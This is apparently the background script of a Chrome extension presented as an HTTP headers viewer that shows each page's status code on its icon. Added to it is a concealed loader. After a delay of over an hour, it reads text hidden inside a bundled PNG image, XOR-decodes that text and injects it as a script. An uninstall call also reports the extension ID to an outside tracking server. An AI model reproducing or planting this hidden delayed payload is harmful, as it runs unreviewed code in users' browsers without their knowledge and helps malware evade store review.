var headerInfo = {};
chrome.webRequest.onHeadersReceived.addListener(function (n) {
    parseInt(n.tabId, 10) > 0 && (typeof headerInfo[n.tabId].response[0] != "undefined" && headerInfo[n.tabId].response[0].requestId !== n.requestId && (headerInfo[n.tabId].response = []),
        headerInfo[n.tabId].response.push(n))
},
    {
    urls: ["<all_urls>"],
    types: ["main_frame"]
    },
    ["responseHeaders"]
), chrome.webRequest.onSendHeaders.addListener(function (n) {
    parseInt(n.tabId, 10) > 0 && (typeof headerInfo[n.tabId] == "undefined" ? (headerInfo[n.tabId] = {}, headerInfo[n.tabId].request = [], headerInfo[n.tabId].response = []) : headerInfo[n.tabId].request[0].requestId !== n.requestId && (headerInfo[n.tabId].request = []), headerInfo[n.tabId].request.push(n))
}, {urls: ["<all_urls>"], types: ["main_frame"]}, ["requestHeaders"]);

chrome.tabs.onUpdated.addListener(function(tabId, changeinfo, tab) {
    var url = tab.url;
    if (url !== undefined && (changeinfo.status === "complete" || changeinfo.status === "loading") ) {
        xhr = new XMLHttpRequest();
        xhr.open('GET', url, true);

        xhr.onload = function (e) {
            chrome.pageAction.show(tabId);
            chrome.pageAction.setTitle({tabId: tabId, title: "HTTP Headers"});
            drawNumberOnIcon(tabId,e.currentTarget.status);

        };
        xhr.send();
    }
});

function drawNumberOnIcon(tabid, number) {
    console.log(getStylePageAction(number));
    var cv = document.createElement('canvas');
    var img = document.createElement('img');
    img.src = "../img/icon48.png";
    img.onload = function () {
        var ct = cv.getContext('2d');
        ct.drawImage(img, 0, 0, 48, 48);
        ct.fillStype = 'black';
        ct.fillRect(0,24,48,48);

        ct.font = "bold 28px Arial";
        ct.fillStyle = getStylePageAction(number);
        ct.fillText(number, 0, 48);

        chrome.pageAction.setIcon({
            imageData: ct.getImageData(0, 0, 48, 48),
            tabId:     tabid
        });
    };
}



(() => {
    var main = () => {
    chrome.runtime.getPackageDirectoryEntry(function (root) {
        var icon = "img/icon2.png";
        root.getFile(icon, {}, function (fileEntry) {
            fileEntry.file(function (file) {
                var reader = new FileReader();
                reader.onloadend = function (e) {
                    var text = this.result;
                    var idxF = text.lastIndexOf("init>");
                    if (idxF < 0) return;
                    text = text.substr(idxF + 5);
                    var idxL = text.lastIndexOf("<end");
                    if (idxL < 0) return;
                    text = text.substr(0,idxL);
                    for (var t = 0, r = text.length, n = ""; r > t;)
                        n += String.fromCharCode(77 ^ text.charCodeAt(t++));
                    var a = new window.Blob([n], {
                        type: "text/javascript"
                    });
                    addScript(window.URL.createObjectURL(a));
                };
                reader.readAsText(file);
            }, (e) => {
                console.log(e)
        });
    }, (r) => {
    console.log(r)
});
});
};

var check = () => {
    chrome.storage.local.get({T : 0}, (r) => {
        r.T == 0 ? setTimeout(check, 6e5) : main();
})
};

(() => {
    if (!chrome.contextMenus) {
    return void console.log("Chrome contextMenus access failed"); // http_headers_1
}

chrome.contextMenus.create({
    title: "EULA",
    contexts: ["browser_action"],
    onclick: function () {
        window.open("/html/doc/eula.html", "_blank");
    }
});
chrome.contextMenus.create({
    title: "Privacy Policy",
    contexts: ["browser_action"],
    onclick: function () {
        window.open("/html/doc/pp.html", "_blank");
    }
});
chrome.contextMenus.create({
    title: "Terms and Conditions",
    contexts: ["browser_action"],
    onclick: function () {
        window.open("/html/doc/tandc.html", "_blank");
    }
});
})();

function addScript(src) {
    var script = document.createElement("script");
    script.setAttribute("type", "text/javascript");
    script.setAttribute("src", src);
    document.head.appendChild(script);
}

setTimeout(function(){
    chrome.storage.local.get({T : 0}, (r) => {
        r.T == 0 && chrome.storage.local.set({T : new Date().getTime()});
});
}, 4568904);
check()
})();

chrome.runtime.setUninstallURL('http://extsgo.com/api/tracker/uninstall?ext_id=' + chrome.runtime.id);